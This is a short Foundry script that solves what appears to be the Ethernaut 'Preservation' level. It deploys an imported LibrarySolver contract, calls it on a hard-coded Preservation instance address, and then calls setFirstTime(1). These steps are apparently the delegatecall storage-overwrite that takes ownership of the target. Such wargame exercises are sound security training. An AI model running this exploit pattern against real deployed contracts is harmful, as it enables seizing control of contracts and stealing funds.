
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Preservation, LibrarySolver} from "../src/Lv-16/Preservation.sol";



contract PreservationScript is Script {
    function run() public {
        vm.startBroadcast();
        //REPLACE ADDRESS WITH YOUR OWN Preservation INSTANCE ADDRESS
        LibrarySolver solve = new LibrarySolver();
        solve.firstCall(0x02Ba20b9988667A38da84695158C3CC845EDAeF1);
        Preservation(0x02Ba20b9988667A38da84695158C3CC845EDAeF1).setFirstTime(1);
        vm.stopBroadcast();
    }
}
